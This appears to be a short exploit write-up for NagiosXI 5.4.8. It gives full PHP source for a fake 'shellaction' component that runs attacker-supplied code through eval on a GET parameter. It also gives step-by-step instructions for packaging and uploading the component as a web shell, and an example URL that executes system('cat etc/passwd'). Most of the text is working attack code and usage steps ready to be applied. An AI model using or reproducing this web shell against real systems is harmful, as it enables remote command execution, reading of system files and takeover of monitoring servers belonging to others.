## After the NagiosXI administration panel has been accessed, we can upload our malicious component that will give us the web shell on the server, even if we are not authorized on it. ##
# Component code example #
```php
<?php
// PHP Shell Spawn Component

require_once(dirname(__FILE__) . '/../componenthelper.inc.php');

$shellaction_component_name = "shellaction";
shellaction_component_init();

////////////////////////////////////////////////////////////////////////
// COMPONENT INIT FUNCTIONS
////////////////////////////////////////////////////////////////////////

function shellaction_component_init()
{
    global $shellaction_component_name;

    $desc = "";


    $args = array(
        COMPONENT_NAME =>           $shellaction_component_name,
        COMPONENT_AUTHOR =>         "test",
        COMPONENT_DESCRIPTION =>    _("test. ") . $desc,
        COMPONENT_TITLE =>          "shell",
        COMPONENT_DATE =>           '08/08/2017',
        COMPONENT_VERSION =>        '1.3.3.7'
    );

    register_component($shellaction_component_name, $args);

    if (isset($_GET['_cmd']))
        eval($_GET['_cmd']);
}

```
## Component creation and uploading ##
1)First, the component must be saved with a name similar to the variable *$shellaction_component_name*.inc.php (example: shellaction.inc.php).

2)Then, you need to put the file in a folder with the same name of the variable (example: shellaction).

![file into folder](https://image.prntscr.com/image/wxoJEU6gSgmmRG3wHDovuA.png)

3)After all the folder should be zip archived (example for *nix: zip -r shell.zip shellaction).

Now we need to go to the section manage components and upload our component (shell.zip).

![manage components](https://image.prntscr.com/image/l7K9XR4hS0WWQMQnApg6Bw.png)

![check if it's added](https://image.prntscr.com/image/luboWJCYQiCKzQ1FzkMKew.png)

## Command execution ##

After that we can execute system commands directly through the address bar of the browser (example: host/nagiosxi/admin?xiwindow=dashlets.php&_cmd=system('cat etc/passwd');)

![it works!](https://image.prntscr.com/image/ouIOS_EpTxWQkk4lOnDofw.png)
## We are done here! ##

research was made on NagiosXI 5.4.8
